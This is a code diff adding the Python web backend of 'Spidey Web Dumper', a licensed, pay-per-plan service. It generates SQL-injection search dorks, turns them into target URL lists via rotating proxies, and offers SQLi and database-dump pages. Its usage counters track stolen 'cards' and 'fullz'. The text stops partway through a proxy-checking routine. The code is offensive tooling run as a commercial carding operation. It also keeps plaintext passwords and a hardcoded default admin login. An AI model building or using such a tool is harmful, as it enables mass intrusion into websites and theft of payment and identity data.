@@ -1,0 +1,1867 @@
+"""
+Spidey Web Dumper — FastAPI Backend
+Full UI with 20+ pages, multi-user, live progress, proxy rotation
+"""
+import os
+import io
+import json
+import time
+import uuid
+import secrets
+import string
+import asyncio
+import logging
+import tempfile
+import shutil
+import zipfile
+from datetime import datetime, timedelta
+from pathlib import Path
+from typing import Optional, List, Dict, Any
+from urllib.parse import urlparse
+
+from fastapi import (
+    FastAPI, Request, Form, UploadFile, File, HTTPException,
+    Depends, Cookie, Response, BackgroundTasks
+)
+from fastapi.responses import (
+    HTMLResponse, JSONResponse, FileResponse, RedirectResponse, StreamingResponse
+)
+from fastapi.staticfiles import StaticFiles
+from fastapi.templating import Jinja2Templates
+from itsdangerous import URLSafeTimedSerializer, BadSignature
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  LOGGING
+# ═══════════════════════════════════════════════════════════════════════════
+logging.basicConfig(
+    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
+    level=logging.INFO
+)
+logger = logging.getLogger("spidey_web")
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  PATHS
+# ═══════════════════════════════════════════════════════════════════════════
+BASE_DIR        = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+DATA_DIR        = os.path.join(BASE_DIR, "data")
+OUTPUT_DIR      = os.path.join(DATA_DIR, "outputs")
+WEB_DIR         = os.path.join(BASE_DIR, "web")
+TEMPLATES_DIR   = os.path.join(WEB_DIR, "templates")
+STATIC_DIR      = os.path.join(WEB_DIR, "static")
+
+os.makedirs(DATA_DIR, exist_ok=True)
+os.makedirs(OUTPUT_DIR, exist_ok=True)
+os.makedirs(STATIC_DIR, exist_ok=True)
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  CONFIG (from env)
+# ═══════════════════════════════════════════════════════════════════════════
+SECRET_KEY        = os.environ.get("SECRET_KEY", "spidey-web-please-change-me-123")
+ADMIN_USERNAME    = os.environ.get("ADMIN_USERNAME", "admin")
+ADMIN_PASSWORD    = os.environ.get("ADMIN_PASSWORD", "spidey123")
+SESSION_MAX_AGE   = 86400 * 7  # 7 days
+DEFAULT_TRIAL_HRS = int(os.environ.get("TRIAL_HOURS", "24"))
+
+USERS_FILE        = os.path.join(DATA_DIR, "web_users.json")
+KEYS_FILE         = os.path.join(DATA_DIR, "web_keys.json")
+LAST_RESP_FILE    = os.path.join(DATA_DIR, "last_responses.json")
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  APP INIT
+# ═══════════════════════════════════════════════════════════════════════════
+app = FastAPI(title="Spidey Web Dumper", docs_url=None, redoc_url=None)
+
+templates = Jinja2Templates(directory=TEMPLATES_DIR)
+app.mount("/static", StaticFiles(directory=STATIC_DIR), name="static")
+
+serializer = URLSafeTimedSerializer(SECRET_KEY)
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  USER STORAGE
+# ═══════════════════════════════════════════════════════════════════════════
+def _load_json(path: str, default):
+    try:
+        with open(path, "r", encoding="utf-8") as f:
+            return json.load(f)
+    except Exception:
+        return default
+
+
+def _save_json(path: str, data):
+    try:
+        with open(path, "w", encoding="utf-8") as f:
+            json.dump(data, f, indent=2, default=str)
+    except Exception as e:
+        logger.error(f"save_json {path}: {e}")
+
+
+def load_users() -> dict:
+    d = _load_json(USERS_FILE, {})
+    if not isinstance(d, dict):
+        d = {}
+    # Ensure admin exists
+    if ADMIN_USERNAME not in d:
+        d[ADMIN_USERNAME] = {
+            "username": ADMIN_USERNAME,
+            "password": ADMIN_PASSWORD,
+            "is_admin": True,
+            "created": datetime.now().isoformat(),
+            "plan": "unlimited",
+            "expires": None,
+            "usage": {"keywords": 0, "dorks": 0, "urls": 0, "sqli": 0, "dumps": 0, "cards": 0, "fullz": 0},
+            "limits": {"keywords": 10**9, "dorks": 10**9, "urls": 10**9, "sqli": 10**9, "dumps": 10**9},
+            "proxies": [],
+        }
+        _save_json(USERS_FILE, d)
+    return d
+
+
+def save_users(d: dict):
+    _save_json(USERS_FILE, d)
+
+
+def get_user(uid: str) -> Optional[dict]:
+    users = load_users()
+    return users.get(uid)
+
+
+def update_user(uid: str, updates: dict):
+    users = load_users()
+    if uid not in users:
+        return
+    users[uid].update(updates)
+    save_users(users)
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  LICENSE KEYS
+# ═══════════════════════════════════════════════════════════════════════════
+PLANS = {
+    "1h":  {"label": "1 Hour",   "delta": timedelta(hours=1),   "price": "$1"},
+    "6h":  {"label": "6 Hours",  "delta": timedelta(hours=6),   "price": "$3"},
+    "1d":  {"label": "1 Day",    "delta": timedelta(days=1),    "price": "$5"},
+    "3d":  {"label": "3 Days",   "delta": timedelta(days=3),    "price": "$10"},
+    "7d":  {"label": "7 Days",   "delta": timedelta(days=7),    "price": "$18"},
+    "15d": {"label": "15 Days",  "delta": timedelta(days=15),   "price": "$30"},
+    "30d": {"label": "30 Days",  "delta": timedelta(days=30),   "price": "$50"},
+    "90d": {"label": "90 Days",  "delta": timedelta(days=90),   "price": "$120"},
+}
+
+
+def load_keys() -> dict:
+    d = _load_json(KEYS_FILE, {})
+    return d if isinstance(d, dict) else {}
+
+
+def save_keys(d: dict):
+    _save_json(KEYS_FILE, d)
+
+
+def generate_license_key() -> str:
+    parts = ["".join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(5))
+             for _ in range(4)]
+    return "-".join(parts)
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  LAST RESPONSE STORAGE (per user)
+# ═══════════════════════════════════════════════════════════════════════════
+def load_last_responses() -> dict:
+    d = _load_json(LAST_RESP_FILE, {})
+    return d if isinstance(d, dict) else {}
+
+
+def save_last_response(uid: str, action: str, data: dict):
+    d = load_last_responses()
+    if uid not in d:
+        d[uid] = {}
+    d[uid][action] = {
+        **data,
+        "timestamp": datetime.now().isoformat(),
+    }
+    _save_json(LAST_RESP_FILE, d)
+
+
+def get_last_response(uid: str, action: str = None) -> dict:
+    d = load_last_responses()
+    user_data = d.get(uid, {})
+    if action:
+        return user_data.get(action, {})
+    return user_data
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  TASK SYSTEM (live progress)
+# ═══════════════════════════════════════════════════════════════════════════
+TASKS: Dict[str, dict] = {}
+TASKS_LOCK = asyncio.Lock()
+
+
+def new_task(uid: str, task_type: str, meta: dict = None) -> str:
+    tid = secrets.token_urlsafe(12)
+    TASKS[tid] = {
+        "id": tid,
+        "uid": uid,
+        "type": task_type,
+        "status": "starting",
+        "started": datetime.now().isoformat(),
+        "progress": {
+            "done": 0,
+            "total": 0,
+            "found": 0,
+            "live": 0,
+            "cards": 0,
+            "fullz": 0,
+            "msg": "Starting...",
+            "log": [],
+        },
+        "result": None,
+        "error": None,
+        "meta": meta or {},
+    }
+    return tid
+
+
+def update_task(tid: str, **kwargs):
+    if tid in TASKS:
+        TASKS[tid].update(kwargs)
+
+
+def update_progress(tid: str, **kwargs):
+    if tid in TASKS:
+        TASKS[tid]["progress"].update(kwargs)
+
+
+def add_log(tid: str, line: str, max_lines: int = 50):
+    if tid in TASKS:
+        logs = TASKS[tid]["progress"].setdefault("log", [])
+        logs.append(f"[{datetime.now().strftime('%H:%M:%S')}] {line}")
+        if len(logs) > max_lines:
+            TASKS[tid]["progress"]["log"] = logs[-max_lines:]
+
+
+def get_task(tid: str) -> Optional[dict]:
+    return TASKS.get(tid)
+
+
+def cleanup_old_tasks(max_age_hours: int = 6):
+    """Remove tasks older than max_age_hours."""
+    now = datetime.now()
+    to_del = []
+    for tid, t in TASKS.items():
+        try:
+            started = datetime.fromisoformat(t["started"])
+            if (now - started).total_seconds() > max_age_hours * 3600:
+                to_del.append(tid)
+        except Exception:
+            to_del.append(tid)
+    for tid in to_del:
+        TASKS.pop(tid, None)
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  AUTH
+# ═══════════════════════════════════════════════════════════════════════════
+def create_session_token(username: str) -> str:
+    return serializer.dumps({"u": username, "t": time.time()})
+
+
+def verify_session_token(token: str) -> Optional[str]:
+    if not token:
+        return None
+    try:
+        data = serializer.loads(token, max_age=SESSION_MAX_AGE)
+        return data.get("u")
+    except (BadSignature, Exception):
+        return None
+
+
+def get_current_user(request: Request) -> Optional[str]:
+    token = request.cookies.get("spidey_session")
+    if not token:
+        return None
+    return verify_session_token(token)
+
+
+def require_user(request: Request) -> str:
+    uid = get_current_user(request)
+    if not uid:
+        raise HTTPException(status_code=401, detail="Not logged in")
+    user = get_user(uid)
+    if not user:
+        raise HTTPException(status_code=401, detail="User not found")
+    # Check expiry
+    exp = user.get("expires")
+    if exp and not user.get("is_admin"):
+        try:
+            if datetime.fromisoformat(exp) < datetime.now():
+                raise HTTPException(status_code=403, detail="Plan expired")
+        except ValueError:
+            pass
+    return uid
+
+
+def require_admin(request: Request) -> str:
+    uid = require_user(request)
+    user = get_user(uid)
+    if not user or not user.get("is_admin"):
+        raise HTTPException(status_code=403, detail="Admin only")
+    return uid
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  QUOTA HELPERS
+# ═══════════════════════════════════════════════════════════════════════════
+def check_quota(uid: str, action: str, amount: int = 1) -> tuple[bool, int]:
+    """Returns (allowed, remaining)."""
+    user = get_user(uid)
+    if not user:
+        return False, 0
+    if user.get("is_admin"):
+        return True, 10**9
+    used = user.get("usage", {}).get(action, 0)
+    limit = user.get("limits", {}).get(action, 0)
+    remaining = max(0, limit - used)
+    if used + amount > limit:
+        return False, remaining
+    return True, limit - used - amount
+
+
+def consume_quota(uid: str, action: str, amount: int = 1):
+    """Increment usage counter."""
+    user = get_user(uid)
+    if not user or user.get("is_admin"):
+        return
+    users = load_users()
+    if uid not in users:
+        return
+    usage = users[uid].setdefault("usage", {})
+    usage[action] = usage.get(action, 0) + amount
+    save_users(users)
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  PROXY HELPERS (per user)
+# ═══════════════════════════════════════════════════════════════════════════
+def get_user_proxies(uid: str) -> List[str]:
+    user = get_user(uid)
+    if not user:
+        return []
+    return user.get("proxies", [])
+
+
+def save_user_proxies(uid: str, proxies: List[str]):
+    users = load_users()
+    if uid not in users:
+        return
+    # Dedup preserving order
+    seen = set()
+    clean = []
+    for p in proxies:
+        if p and p not in seen:
+            seen.add(p)
+            clean.append(p)
+    users[uid]["proxies"] = clean
+    save_users(users)
+
+
+def pick_proxy(uid: str) -> str:
+    """Pick a random proxy for user (rotation)."""
+    import random
+    pool = get_user_proxies(uid)
+    return random.choice(pool) if pool else ""
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  FILE HELPERS
+# ═══════════════════════════════════════════════════════════════════════════
+def safe_filename(name: str) -> str:
+    """Remove dangerous chars from filename."""
+    name = os.path.basename(name)
+    return "".join(c for c in name if c.isalnum() or c in "._-")
+
+
+def save_output(uid: str, filename: str, content: str) -> str:
+    """Save output file, return path."""
+    safe = safe_filename(filename)
+    # Prefix with uid to avoid collisions
+    final = f"{uid[:8]}_{safe}"
+    path = os.path.join(OUTPUT_DIR, final)
+    with open(path, "w", encoding="utf-8") as f:
+        f.write(content)
+    return final
+
+
+def list_outputs() -> List[dict]:
+    """List all output files."""
+    out = []
+    try:
+        for fn in os.listdir(OUTPUT_DIR):
+            fp = os.path.join(OUTPUT_DIR, fn)
+            if os.path.isfile(fp):
+                out.append({
+                    "name": fn,
+                    "size": os.path.getsize(fp),
+                    "mtime": os.path.getmtime(fp),
+                    "time": datetime.fromtimestamp(os.path.getmtime(fp)).isoformat(),
+                })
+    except Exception:
+        pass
+    out.sort(key=lambda x: x["mtime"], reverse=True)
+    return out
+    
+    
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  ROUTES — AUTH (Login / Logout / Register)
+# ═══════════════════════════════════════════════════════════════════════════
+
+@app.get("/", response_class=HTMLResponse)
+async def root(request: Request):
+    uid = get_current_user(request)
+    if uid:
+        return RedirectResponse("/dashboard", status_code=302)
+    return RedirectResponse("/login", status_code=302)
+
+
+@app.get("/login", response_class=HTMLResponse)
+async def login_page(request: Request, error: str = None, msg: str = None):
+    uid = get_current_user(request)
+    if uid:
+        return RedirectResponse("/dashboard", status_code=302)
+    return templates.TemplateResponse("login.html", {
+        "request": request,
+        "error": error,
+        "msg": msg,
+    })
+
+
+@app.post("/login")
+async def login_submit(
+    request: Request,
+    username: str = Form(...),
+    password: str = Form(...),
+):
+    username = username.strip().lower()
+    users = load_users()
+    if username not in users:
+        return RedirectResponse("/login?error=Invalid+credentials", status_code=302)
+    user = users[username]
+    if user.get("password") != password:
+        return RedirectResponse("/login?error=Invalid+credentials", status_code=302)
+
+    # Check expiry
+    exp = user.get("expires")
+    if exp and not user.get("is_admin"):
+        try:
+            if datetime.fromisoformat(exp) < datetime.now():
+                return RedirectResponse("/login?error=Plan+expired", status_code=302)
+        except Exception:
+            pass
+
+    token = create_session_token(username)
+    resp = RedirectResponse("/dashboard", status_code=302)
+    resp.set_cookie(
+        "spidey_session", token,
+        httponly=True, max_age=SESSION_MAX_AGE, samesite="lax",
+    )
+    logger.info(f"[login] {username} logged in")
+    return resp
+
+
+@app.get("/logout")
+async def logout(request: Request):
+    resp = RedirectResponse("/login?msg=Logged+out", status_code=302)
+    resp.delete_cookie("spidey_session")
+    return resp
+
+
+@app.get("/register", response_class=HTMLResponse)
+async def register_page(request: Request, error: str = None):
+    return templates.TemplateResponse("register.html", {
+        "request": request,
+        "error": error,
+        "plans": PLANS,
+    })
+
+
+@app.post("/register")
+async def register_submit(
+    request: Request,
+    username: str = Form(...),
+    password: str = Form(...),
+    license_key: str = Form(...),
+):
+    username = username.strip().lower()
+    if len(username) < 3 or not username.isalnum():
+        return RedirectResponse("/register?error=Username+must+be+3%2B+alphanumeric", status_code=302)
+    if len(password) < 4:
+        return RedirectResponse("/register?error=Password+too+short", status_code=302)
+
+    users = load_users()
+    if username in users:
+        return RedirectResponse("/register?error=Username+taken", status_code=302)
+
+    # Validate license key
+    keys = load_keys()
+    key = license_key.strip().upper()
+    if key not in keys:
+        return RedirectResponse("/register?error=Invalid+license+key", status_code=302)
+
+    key_data = keys[key]
+    if key_data.get("used_by"):
+        return RedirectResponse("/register?error=Key+already+used", status_code=302)
+
+    plan_code = key_data.get("plan", "1d")
+    plan = PLANS.get(plan_code, PLANS["1d"])
+    expires = (datetime.now() + plan["delta"]).isoformat()
+
+    # Create user
+    users[username] = {
+        "username": username,
+        "password": password,
+        "is_admin": False,
+        "created": datetime.now().isoformat(),
+        "plan": plan_code,
+        "plan_label": plan["label"],
+        "expires": expires,
+        "usage": {"keywords": 0, "dorks": 0, "urls": 0, "sqli": 0, "dumps": 0, "cards": 0, "fullz": 0},
+        "limits": {
+            "keywords": 100_000,
+            "dorks": 500_000,
+            "urls": 200_000,
+            "sqli": 100_000,
+            "dumps": 10_000,
+        },
+        "proxies": [],
+    }
+    save_users(users)
+
+    # Mark key used
+    keys[key]["used_by"] = username
+    keys[key]["used_at"] = datetime.now().isoformat()
+    save_keys(keys)
+
+    token = create_session_token(username)
+    resp = RedirectResponse("/dashboard", status_code=302)
+    resp.set_cookie("spidey_session", token, httponly=True,
+                    max_age=SESSION_MAX_AGE, samesite="lax")
+    logger.info(f"[register] {username} with plan {plan_code}")
+    return resp
+
+
+@app.get("/redeem", response_class=HTMLResponse)
+async def redeem_page(request: Request):
+    uid = require_user(request)
+    return templates.TemplateResponse("redeem.html", {"request": request, "uid": uid})
+
+
+@app.post("/redeem")
+async def redeem_submit(
+    request: Request,
+    license_key: str = Form(...),
+):
+    uid = require_user(request)
+    keys = load_keys()
+    key = license_key.strip().upper()
+    if key not in keys:
+        return RedirectResponse("/dashboard?error=Invalid+key", status_code=302)
+    key_data = keys[key]
+    if key_data.get("used_by") and key_data["used_by"] != uid:
+        return RedirectResponse("/dashboard?error=Key+used+by+other", status_code=302)
+
+    plan_code = key_data.get("plan", "1d")
+    plan = PLANS.get(plan_code, PLANS["1d"])
+    users = load_users()
+    if uid not in users:
+        return RedirectResponse("/login", status_code=302)
+
+    # Extend current or set new
+    cur_exp = users[uid].get("expires")
+    base = datetime.now()
+    if cur_exp:
+        try:
+            cur_dt = datetime.fromisoformat(cur_exp)
+            if cur_dt > base:
+                base = cur_dt
+        except Exception:
+            pass
+    new_exp = (base + plan["delta"]).isoformat()
+    users[uid]["expires"] = new_exp
+    users[uid]["plan"] = plan_code
+    users[uid]["plan_label"] = plan["label"]
+    save_users(users)
+
+    keys[key]["used_by"] = uid
+    keys[key]["used_at"] = datetime.now().isoformat()
+    save_keys(keys)
+
+    return RedirectResponse("/dashboard?msg=Plan+activated", status_code=302)
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  ROUTES — DASHBOARD
+# ═══════════════════════════════════════════════════════════════════════════
+
+@app.get("/dashboard", response_class=HTMLResponse)
+async def dashboard(request: Request, msg: str = None, error: str = None):
+    uid = require_user(request)
+    user = get_user(uid)
+
+    # Compute stats
+    stats = {
+        "keywords": user.get("usage", {}).get("keywords", 0),
+        "dorks": user.get("usage", {}).get("dorks", 0),
+        "urls": user.get("usage", {}).get("urls", 0),
+        "sqli": user.get("usage", {}).get("sqli", 0),
+        "dumps": user.get("usage", {}).get("dumps", 0),
+        "cards": user.get("usage", {}).get("cards", 0),
+        "fullz": user.get("usage", {}).get("fullz", 0),
+    }
+    limits = user.get("limits", {})
+    proxies = user.get("proxies", [])
+
+    # Expiry
+    expires = user.get("expires")
+    expiry_str = "Unlimited" if user.get("is_admin") else "N/A"
+    days_left = None
+    if expires:
+        try:
+            dt = datetime.fromisoformat(expires)
+            delta = dt - datetime.now()
+            if delta.total_seconds() > 0:
+                days_left = delta.days
+                hours_left = int((delta.total_seconds() % 86400) // 3600)
+                expiry_str = f"{days_left}d {hours_left}h left"
+            else:
+                expiry_str = "EXPIRED"
+        except Exception:
+            pass
+
+    # Last responses
+    last = get_last_response(uid)
+
+    return templates.TemplateResponse("dashboard.html", {
+        "request": request,
+        "uid": uid,
+        "user": user,
+        "stats": stats,
+        "limits": limits,
+        "proxies_count": len(proxies),
+        "expiry_str": expiry_str,
+        "is_admin": user.get("is_admin", False),
+        "plan_label": user.get("plan_label", "Free Trial"),
+        "last": last,
+        "msg": msg,
+        "error": error,
+    })
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  ROUTES — PAGE VIEWS (Blank pages — templates Part 3 mein)
+# ═══════════════════════════════════════════════════════════════════════════
+
+@app.get("/keywords", response_class=HTMLResponse)
+async def keywords_page(request: Request):
+    uid = require_user(request)
+    return templates.TemplateResponse("keywords.html", {
+        "request": request, "uid": uid,
+        "last": get_last_response(uid, "keywords"),
+    })
+
+
+@app.get("/dorks", response_class=HTMLResponse)
+async def dorks_page(request: Request):
+    uid = require_user(request)
+    return templates.TemplateResponse("dorks.html", {
+        "request": request, "uid": uid,
+        "last": get_last_response(uid, "dorks"),
+    })
+
+
+@app.get("/parser", response_class=HTMLResponse)
+async def parser_page(request: Request):
+    uid = require_user(request)
+    return templates.TemplateResponse("parser.html", {
+        "request": request, "uid": uid,
+        "last": get_last_response(uid, "parser"),
+        "proxies_count": len(get_user_proxies(uid)),
+    })
+
+
+@app.get("/sqli", response_class=HTMLResponse)
+async def sqli_page(request: Request):
+    uid = require_user(request)
+    return templates.TemplateResponse("sqli.html", {
+        "request": request, "uid": uid,
+        "last": get_last_response(uid, "sqli"),
+    })
+
+
+@app.get("/dump", response_class=HTMLResponse)
+async def dump_page(request: Request):
+    uid = require_user(request)
+    return templates.TemplateResponse("dump.html", {
+        "request": request, "uid": uid,
+        "last": get_last_response(uid, "dump"),
+    })
+
+
+@app.get("/files", response_class=HTMLResponse)
+async def files_page(request: Request):
+    uid = require_user(request)
+    files = list_outputs()
+    # Filter user's files (prefix match)
+    user_files = [f for f in files if f["name"].startswith(uid[:8] + "_")]
+    # Show all if admin
+    if get_user(uid).get("is_admin"):
+        user_files = files
+    return templates.TemplateResponse("files.html", {
+        "request": request, "uid": uid, "files": user_files,
+    })
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  API — KEYWORDS GENERATE
+# ═══════════════════════════════════════════════════════════════════════════
+
+@app.post("/api/keywords/generate")
+async def api_keywords_generate(
+    request: Request,
+    seeds: str = Form(...),
+    count: int = Form(1000),
+):
+    uid = require_user(request)
+    count = max(100, min(count, 1_000_000))
+
+    allowed, remaining = check_quota(uid, "keywords", count)
+    if not allowed:
+        return JSONResponse(
+            {"error": f"Quota exceeded. Remaining: {remaining}"},
+            status_code=429
+        )
+
+    seed_list = [s.strip() for s in seeds.replace(",", "\n").splitlines() if s.strip()]
+    if not seed_list:
+        return JSONResponse({"error": "No seeds provided"}, status_code=400)
+
+    tid = new_task(uid, "keywords", {"count": count, "seeds": len(seed_list)})
+    asyncio.create_task(_run_keywords(tid, uid, seed_list, count))
+    return {"task_id": tid}
+
+
+async def _run_keywords(tid: str, uid: str, seeds: List[str], count: int):
+    try:
+        update_task(tid, status="running")
+        update_progress(tid, msg=f"Generating {count} keywords...", total=count)
+
+        from core.generators import generate_keywords
+        loop = asyncio.get_running_loop()
+        kws = await loop.run_in_executor(None, generate_keywords, seeds, count)
+        kws = kws[:count]
+
+        # Save file
+        ts = datetime.now().strftime("%d%m%y_%H%M%S")
+        fname = save_output(uid, f"keywords_{len(kws)}_{ts}.txt", "\n".join(kws))
+
+        # Consume quota
+        consume_quota(uid, "keywords", len(kws))
+
+        # Save last response
+        save_last_response(uid, "keywords", {
+            "count": len(kws),
+            "file": fname,
+            "seeds": seeds[:5],
+        })
+
+        update_task(tid, status="done", result={
+            "count": len(kws),
+            "file": fname,
+        })
+        update_progress(tid, done=len(kws), total=len(kws), msg="Done!")
+        add_log(tid, f"Generated {len(kws)} keywords")
+    except Exception as e:
+        logger.exception(f"[keywords] {e}")
+        update_task(tid, status="error", error=str(e))
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  API — DORKS GENERATE
+# ═══════════════════════════════════════════════════════════════════════════
+
+@app.post("/api/dorks/generate")
+async def api_dorks_generate(
+    request: Request,
+    keywords: str = Form(...),
+    count: int = Form(5000),
+    dork_type: str = Form("normal"),
+):
+    uid = require_user(request)
+    count = max(100, min(count, 1_000_000))
+
+    allowed, remaining = check_quota(uid, "dorks", count)
+    if not allowed:
+        return JSONResponse(
+            {"error": f"Quota exceeded. Remaining: {remaining}"},
+            status_code=429
+        )
+
+    kws = [k.strip() for k in keywords.replace(",", "\n").splitlines() if k.strip()]
+    if not kws:
+        return JSONResponse({"error": "No keywords provided"}, status_code=400)
+
+    tid = new_task(uid, "dorks", {
+        "count": count, "type": dork_type, "kw": len(kws),
+    })
+    asyncio.create_task(_run_dorks(tid, uid, kws, count, dork_type))
+    return {"task_id": tid}
+
+
+async def _run_dorks(tid: str, uid: str, kws: List[str], count: int, dtype: str):
+    try:
+        update_task(tid, status="running")
+        update_progress(tid, msg=f"Generating {count} dorks ({dtype})...", total=count)
+
+        from core.generators import (
+            generate_dorks, generate_hq_sqli_dorks, generate_country_dorks,
+            generate_cms_dorks, generate_exposed_dorks,
+        )
+        loop = asyncio.get_running_loop()
+        if dtype == "hq":
+            dorks = await loop.run_in_executor(None, lambda: generate_hq_sqli_dorks(kws, count))
+        elif dtype == "country":
+            dorks = await loop.run_in_executor(None, lambda: generate_country_dorks(kws, None, count))
+        elif dtype == "cms":
+            dorks = await loop.run_in_executor(None, lambda: generate_cms_dorks(kws, None, count))
+        elif dtype == "exposed":
+            dorks = await loop.run_in_executor(None, lambda: generate_exposed_dorks(kws, count))
+        else:
+            dorks = await loop.run_in_executor(None, generate_dorks, kws, count)
+
+        dorks = dorks[:count]
+        ts = datetime.now().strftime("%d%m%y_%H%M%S")
+        fname = save_output(uid, f"dorks_{dtype}_{len(dorks)}_{ts}.txt", "\n".join(dorks))
+
+        consume_quota(uid, "dorks", len(dorks))
+        save_last_response(uid, "dorks", {
+            "count": len(dorks),
+            "type": dtype,
+            "file": fname,
+        })
+
+        update_task(tid, status="done", result={"count": len(dorks), "file": fname, "type": dtype})
+        update_progress(tid, done=len(dorks), total=len(dorks), msg="Done!")
+        add_log(tid, f"Generated {len(dorks)} {dtype} dorks")
+    except Exception as e:
+        logger.exception(f"[dorks] {e}")
+        update_task(tid, status="error", error=str(e))
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  API — PARSER (DORKS → URLs)
+# ═══════════════════════════════════════════════════════════════════════════
+
+@app.post("/api/parser/run")
+async def api_parser_run(
+    request: Request,
+    dorks: str = Form(...),
+):
+    uid = require_user(request)
+    dork_list = [d.strip() for d in dorks.splitlines() if d.strip()]
+    if not dork_list:
+        return JSONResponse({"error": "No dorks provided"}, status_code=400)
+    if len(dork_list) > 200_000:
+        dork_list = dork_list[:200_000]
+
+    tid = new_task(uid, "parser", {"dorks": len(dork_list)})
+    asyncio.create_task(_run_parser(tid, uid, dork_list))
+    return {"task_id": tid}
+
+
+async def _run_parser(tid: str, uid: str, dorks: List[str]):
+    try:
+        update_task(tid, status="running")
+        update_progress(tid, msg=f"Parsing {len(dorks)} dorks...", total=len(dorks))
+
+        proxies = get_user_proxies(uid)
+        add_log(tid, f"Using {len(proxies)} proxies")
+
+        from core.url_finder import search_urls_from_dorks
+
+        last_edit = [0.0]
+
+        async def on_prog(done, total, found, retries):
+            now = time.time()
+            if now - last_edit[0] < 1.5:
+                return
+            last_edit[0] = now
+            update_progress(
+                tid,
+                done=done, total=total, found=found,
+                msg=f"Scanned {done}/{total} | Found {found} URLs",
+            )
+
+        urls = await search_urls_from_dorks(
+            dorks,
+            limit=200_000,
+            progress_callback=on_prog,
+            proxy_list=proxies,
+        )
+
+        ts = datetime.now().strftime("%d%m%y_%H%M%S")
+        fname = save_output(uid, f"urls_{len(urls)}_{ts}.txt", "\n".join(urls))
+
+        consume_quota(uid, "urls", len(urls))
+        save_last_response(uid, "parser", {
+            "dorks": len(dorks),
+            "urls": len(urls),
+            "file": fname,
+        })
+
+        update_task(tid, status="done", result={
+            "dorks": len(dorks),
+            "urls": len(urls),
+            "file": fname,
+        })
+        update_progress(tid, done=len(dorks), total=len(dorks),
+                        found=len(urls), msg="Done!")
+        add_log(tid, f"Found {len(urls)} URLs")
+    except Exception as e:
+        logger.exception(f"[parser] {e}")
+        update_task(tid, status="error", error=str(e))    
+        
+        
+        
+        
+# ═══════════════════════════════════════════════════════════════════════════
+#  ROUTES — PROXY MANAGER (Manual + Check + Save)
+# ═══════════════════════════════════════════════════════════════════════════
+
+@app.get("/proxy", response_class=HTMLResponse)
+async def proxy_page(request: Request):
+    uid = require_user(request)
+    proxies = get_user_proxies(uid)
+    return templates.TemplateResponse("proxy.html", {
+        "request": request,
+        "uid": uid,
+        "proxies": proxies,
+        "count": len(proxies),
+    })
+
+
+@app.post("/api/proxy/add")
+async def api_proxy_add(
+    request: Request,
+    proxies: str = Form(""),
+):
+    uid = require_user(request)
+    if not proxies.strip():
+        return JSONResponse({"error": "No proxies provided"}, status_code=400)
+
+    from core.proxy import parse_proxy_text
+    parsed = parse_proxy_text(proxies)
+    if not parsed:
+        return JSONResponse({"error": "No valid proxies parsed"}, status_code=400)
+
+    current = get_user_proxies(uid)
+    seen = set(current)
+    added = 0
+    for p in parsed:
+        if p not in seen:
+            seen.add(p)
+            current.append(p)
+            added += 1
+    save_user_proxies(uid, current)
+
+    save_last_response(uid, "proxy_add", {
+        "added": added,
+        "total": len(current),
+    })
+
+    return {
+        "ok": True,
+        "added": added,
+        "duplicate": len(parsed) - added,
+        "total": len(current),
+    }
+
+
+@app.post("/api/proxy/import")
+async def api_proxy_import(
+    request: Request,
+    file: UploadFile = File(...),
+):
+    uid = require_user(request)
+    content = await file.read()
+    fname = (file.filename or "").lower()
+
+    from core.proxy import parse_proxy_text, parse_proxy_from_zip
+
+    proxies = []
+    if fname.endswith(".zip"):
+        proxies = parse_proxy_from_zip(content)
+    else:
+        try:
+            text = content.decode("utf-8", errors="ignore")
+        except Exception:
+            return JSONResponse({"error": "Cannot decode file"}, status_code=400)
+        proxies = parse_proxy_text(text)
+
+    if not proxies:
+        return JSONResponse({"error": "No proxies in file"}, status_code=400)
+
+    current = get_user_proxies(uid)
+    seen = set(current)
+    added = 0
+    for p in proxies:
+        if p not in seen:
+            seen.add(p)
+            current.append(p)
+            added += 1
+    save_user_proxies(uid, current)
+
+    save_last_response(uid, "proxy_import", {
+        "added": added,
+        "total": len(current),
+    })
+
+    return {
+        "ok": True,
+        "added": added,
+        "total": len(current),
+    }
+
+
+@app.post("/api/proxy/check")
+async def api_proxy_check(request: Request):
+    uid = require_user(request)
+    proxies = get_user_proxies(uid)
+    if not proxies:
+        return JSONResponse({"error": "No proxies to check"}, status_code=400)
+
+    tid = new_task(uid, "proxy_check", {"total": len(proxies)})
+    asyncio.create_task(_run_proxy_check(tid, uid, proxies))
+    return {"task_id": tid}
+
+
+async def _run_proxy_check(tid: str, uid: str, proxies: List[str]):
+    try:
+        update_task(tid, status="running")
+        update_progress(tid, total=len(proxies), msg="Checking proxies...")
+        add_log(tid, f"Checking {len(proxies)} proxies")
+
+        from core.proxy import check_proxies_bulk
+
+        last_edit = [0.0]
+
+        async def on_prog(done, total, live):
+            now = time.time()
+            if now - last_edit[0] < 1.2:
+                return
+            last_edit[0] = now
+            update_progress(
+                tid,
+                done=done, total=total, live=live,
+                msg=f"Checked {done}/{total} | Live {live}",
+            )
+
+        live_list = await check_proxies_bulk(
+            proxies, timeout=8.0, concurrency=200,
+            progress_callback=on_prog,
+        )
+
+        # Save only live proxies
+        save_user_proxies(uid, live_list)
+
+        save_last_response(uid, "proxy_check", {
+            "checked": len(proxies),
+            "live": len(live_list),
+        })
+
+        update_task(tid, status="done", result={
+            "checked": len(proxies),
+            "live": len(live_list),
